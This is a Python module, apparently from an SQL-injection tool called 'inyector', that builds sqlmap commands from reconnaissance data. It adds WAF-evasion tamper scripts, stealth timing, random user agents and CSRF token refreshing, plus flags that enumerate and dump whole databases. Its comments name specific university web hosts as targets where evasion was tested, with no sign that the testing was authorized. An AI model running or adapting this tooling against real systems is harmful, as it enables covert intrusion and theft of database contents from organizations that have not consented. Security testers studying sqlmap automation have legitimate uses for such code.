"""Módulo de construcción del comando sqlmap.

Construye el comando sqlmap completo basándose en todos
los resultados del reconocimiento e inteligencia.
"""

import shlex
from typing import Optional
from urllib.parse import urlparse
from inyector.utils.logger import get_logger

logger = get_logger(__name__)


class CommandBuilder:
    """Construye el comando sqlmap optimizado según el reconocimiento."""

    def build(self, scan_config: dict) -> str:
        """Construye el comando completo de sqlmap.

        Args:
            scan_config: Configuración completa del scan.

        Returns:
            Comando sqlmap completo como string.
        """
        parts = ["sqlmap"]

        url = scan_config["url"]
        method = scan_config.get("method", "GET")
        data = scan_config.get("data")
        param = scan_config.get("param")
        cookie = scan_config.get("cookie")
        headers = scan_config.get("headers", [])
        waf = scan_config.get("waf", {}).get("waf", "none")
        timing = scan_config.get("timing", {})
        tampers = scan_config.get("tampers", [])
        technique = scan_config.get("technique")
        level = scan_config.get("level", 2)
        risk = scan_config.get("risk", 1)
        threads = scan_config.get("threads", 3)
        proxy = scan_config.get("proxy")
        output_dir = scan_config.get("output_dir", "/app/reports")
        stealth = scan_config.get("stealth", True)
        csrf_token = scan_config.get("csrf_token")
        csrf_url = scan_config.get("csrf_url")
        csrf_method = scan_config.get("csrf_method", "GET")
        flush_session = scan_config.get("flush_session", True)
        dump_config = scan_config.get("dump")

        # 1. URL base
        parts.append(f"-u {shlex.quote(url)}")

        # 2. Modo batch (no interactivo)
        parts.append("--batch")
        parts.append("--no-cast")

        # 3. Método y datos POST
        # shlex.quote (no comillas dobles a mano): un body JSON trae
        # sus propias comillas dobles, que rompían el armado del
        # comando cuando se lo pasa al shell (bug real encontrado al
        # agregar soporte de --crawl para candidatos JSON tipo login).
        if method.upper() == "POST" and data:
            parts.append(f"--data={shlex.quote(data)}")

        # 4. Parámetro objetivo
        # shlex.quote acá también: nombres de campo de ASP.NET WebForms
        # (ej. 'ctl00$cphContenido$txtNoControl') traen '$' literales,
        # que shell=True en sqlmap_runner.py expande como variable de
        # entorno (vacía) si no van entre comillas simples. Sin el
        # quote, sqlmap terminaba probando el param truncado 'ctl00'
        # -- no existe en el POST real, así que sqlmap ni lo prueba y
        # sale en segundos con 'no vulnerable' sin haber corrido nada
        # (bug real encontrado contra cloud.teziutlan.tecnm.mx).
        if param:
            parts.append(f"-p {shlex.quote(param)}")

        # 5. Técnica SQLi
        selected_technique = self._select_technique(waf, stealth, technique)
        parts.append(f"--technique={selected_technique}")

        # 6. Tamper scripts
        if tampers:
            tamper_str = ",".join(tampers)
            parts.append(f"--tamper={tamper_str}")

        # 7. Timing (modo stealth)
        if timing:
            delay = timing.get("delay", 0)
            timeout = timing.get("timeout", 30)
            retries = timing.get("retries", 3)
            safe_freq = timing.get("safe_freq", 0)

            if delay > 0:
                parts.append(f"--delay={delay}")
            parts.append(f"--timeout={timeout}")
            parts.append(f"--retries={retries}")
            if safe_freq > 0:
                # sqlmap ignora --safe-freq sin --safe-url (no hay a
                # qué URL "descansar" entre ráfagas de payloads) -- bug
                # real encontrado validando evasión contra UAEH: la
                # pausa periódica nunca se activaba porque faltaba
                # este flag, aunque se detectara WAF y se calculara
                # safe_freq > 0. Usamos la raíz del dominio como
                # request "inocente" entre tandas de ataque.
                parsed = urlparse(url)
                safe_url = f"{parsed.scheme}://{parsed.netloc}/"
                parts.append(f"--safe-freq={safe_freq}")
                parts.append(f"--safe-url={shlex.quote(safe_url)}")

        # 8. User-Agent realista
        parts.append("--random-agent")

        # 9. Cookie de sesión
        if cookie:
            parts.append(f"--cookie={shlex.quote(cookie)}")

        # 10. Headers adicionales
        for header in headers:
            parts.append(f"--header={shlex.quote(header)}")

        # 10.5 Token anti-CSRF/dinámico -- sqlmap lo refresca ANTES DE
        # CADA request (no solo una vez al armar --data), porque el
        # server lo regenera en cada respuesta y algunos (ej. Moodle
        # 'logintoken') son de un solo uso -- confirmado que reusar un
        # valor viejo re-renderiza el form en blanco, sin procesar el
        # login (tie.teziutlan.tecnm.mx). El valor estático ya
        # capturado se deja en --data igual: sqlmap necesita ALGO
        # válido para armar el primer request antes de que su propio
        # refresh entre en juego. --csrf-method siempre explícito
        # (GET): csrf_url es una página a leer, no un submit.
        if csrf_token:
            parts.append(f"--csrf-token={shlex.quote(csrf_token)}")
            parts.append(f"--csrf-url={shlex.quote(csrf_url or url)}")
            parts.append(f"--csrf-method={shlex.quote(csrf_method)}")

        # 10.6 Flags de enumeración/extracción (comando `dump`) -- se
        # agregan acá, ANTES de level/risk, para que la escalada de
        # nivel/risk del llamador (ver `_run_dump_with_persistence` en
        # dump.py) siga aplicando igual sobre el mismo comando.
        if dump_config:
            parts.extend(self._build_dump_flags(dump_config))

        # 11. Level y Risk
        parts.append(f"--level={level}")
        parts.append(f"--risk={risk}")

        # 12. Threads
        # sqlmap rechaza la combinación de '--csrf-token' con '--threads'
        # ("option '--csrf-token' is incompatible with option '--threads'")
        # -- bug real encontrado contra tie.teziutlan.tecnm.mx (Moodle):
        # el scan fallaba instantáneamente (exit code 1, 0 requests
        # mandadas) en cualquier target con token CSRF wireado. Tiene
        # sentido además del lado de sqlmap: con threads > 1 el refresco
        # del token podría pisarse entre requests concurrentes. Omitir
        # el flag deja a sqlmap en su default (1 thread), que es lo
        # correcto acá de todos modos.
        if not csrf_token:
            parts.append(f"--threads={threads}")

        # 13. Output
        parts.append(f"--output-dir={output_dir}")

        # 14. Proxy
        if proxy:
            parts.append(f"--proxy={shlex.quote(proxy)}")

        # 15. Flags de evasión adicionales según WAF
        # 'modsecurity' -> --hex quedó descartado: sqlmap rechaza esa
        # combinación ("switch '--no-cast' is incompatible with switch
        # '--hex'") porque --no-cast se agrega siempre arriba -- bug
        # real que hacía fallar sqlmap instantáneamente (exit code 1,
        # 0s) en cualquier scan contra un target modsecurity, sin
        # mandar una sola request. Los tampers ya seleccionados para
        # modsecurity (apostrophemask, base64encode,
        # charunicodeencode...) cubren la evasión sin necesitar --hex.
        if waf == "cloudflare":
            parts.append("--hpp")

        # 'keyword_sinkhole' -> --ignore-redirects. Este WAF bloquea
        # con un 302 hacia un dominio ajeno que ni siquiera resuelve
        # (ver WAFDetector/keyword_sinkhole) -- por default (--batch
        # responde 'Y' a "do you want to follow?") sqlmap SIGUE ese
        # redirect y reintenta la resolución DNS varias veces con
        # backoff antes de rendirse, metiendo demoras grandes y
        # variables (varios segundos) en cada request bloqueado. Eso
        # contamina justo la señal que mide la técnica time-based
        # blind (un delay de reintento de DNS es indistinguible de un
        # SLEEP real) -- bug real encontrado contra itescam.edu.mx:
        # sqlmap marcaba 'id' como injectable en el heurístico inicial
        # pero su propia re-verificación lo rechazaba después, aun con
        # los tampers correctos ya seleccionados.
        if waf == "keyword_sinkhole":
            parts.append("--ignore-redirects")

        # 16. Si ORM detectado con raw queries
        orm_data = scan_config.get("orm", {})
        if orm_data.get("raw_queries_likely"):
            orm_name = orm_data.get("orm", "")
            orm_strings = {
                "django_orm": "OperationalError",
                "sqlalchemy": "sqlalchemy.exc",
                "hibernate": "HibernateException",
                "eloquent": "QueryException",
            }
            if orm_name in orm_strings:
                parts.append(f"--string={shlex.quote(orm_strings[orm_name])}")

        # 17. Flush session
        # `dump` pasa flush_session=False a propósito: sqlmap cachea la
        # técnica/DBMS ya confirmados en su propia sesión
        # (`<output_dir>/<host>/session.sqlite`) -- flushearla en cada
        # invocación de `dump` obligaría a sqlmap a re-detectar la
        # inyección desde cero cada vez, en vez de ir directo a
        # enumerar/extraer. `scan` sigue flusheando siempre (default
        # True) -- no cambia su comportamiento existente.
        if flush_session:
            parts.append("--flush-session")

        comando = " ".join(parts)
        logger.info(f"Comando sqlmap construido ({len(parts)} flags)")
        logger.debug(f"Comando: {comando}")

        return comando

    def _build_dump_flags(self, dump_config: dict) -> list[str]:
        """Traduce la config de acción de `dump` a flags reales de
        enumeración/extracción de sqlmap.

        Args:
            dump_config: dict con al menos "action" (uno de "current",
                "dbs", "tables", "columns", "dump", "dump_all",
                "search") y, según la acción, "db"/"table"/"columns"/
                "where"/"start"/"stop"/"exclude_sysdbs"/"search_term".

        Returns:
            Lista de flags de sqlmap (sin unir), ya con shlex.quote
            donde corresponde.
        """
        action = dump_config.get("action")
        db = dump_config.get("db")
        table = dump_config.get("table")
        columns = dump_config.get("columns")
        where = dump_config.get("where")
        flags: list[str] = []

        if action == "current":
            flags.extend([
                "--current-db", "--current-user", "--hostname", "--is-dba",
            ])
        elif action == "dbs":
            flags.append("--dbs")
        elif action == "tables":
            if db:
                flags.append(f"-D {shlex.quote(db)}")
            flags.append("--tables")
        elif action == "columns":
            if db:
                flags.append(f"-D {shlex.quote(db)}")
            if table:
                flags.append(f"-T {shlex.quote(table)}")
            flags.append("--columns")
        elif action == "dump":
            if db:
                flags.append(f"-D {shlex.quote(db)}")
            if table:
                flags.append(f"-T {shlex.quote(table)}")
            flags.append("--dump")
            if columns:
                flags.append(f"-C {shlex.quote(columns)}")
            if where:
                flags.append(f"--where={shlex.quote(where)}")
            if dump_config.get("start"):
                flags.append(f"--start={dump_config['start']}")
            if dump_config.get("stop"):
                flags.append(f"--stop={dump_config['stop']}")
        elif action == "dump_all":
            flags.append("--dump-all")
            if dump_config.get("exclude_sysdbs", True):
                flags.append("--exclude-sysdbs")
        elif action == "search":
            flags.append("--search")
            if db:
                flags.append(f"-D {shlex.quote(db)}")
            if table:
                flags.append(f"-T {shlex.quote(table)}")
            if columns:
                flags.append(f"-C {shlex.quote(columns)}")

        return flags

    def _select_technique(self, waf: str, stealth: bool,
                          user_technique: Optional[str]) -> str:
        """Selecciona la técnica de SQLi basándose en el contexto.

        Args:
            waf: WAF detectado.
            stealth: Si es True, usar técnicas silenciosas.
            user_technique: Técnica forzada por el usuario.

        Returns:
            String con técnicas (ej: 'BT', 'BEUSTQ').
        """
        if user_technique:
            return user_technique.upper()

        if stealth and waf != "none":
            return "BT"

        if waf == "none" and not stealth:
            return "BEUSTQ"

        return "BEUT"
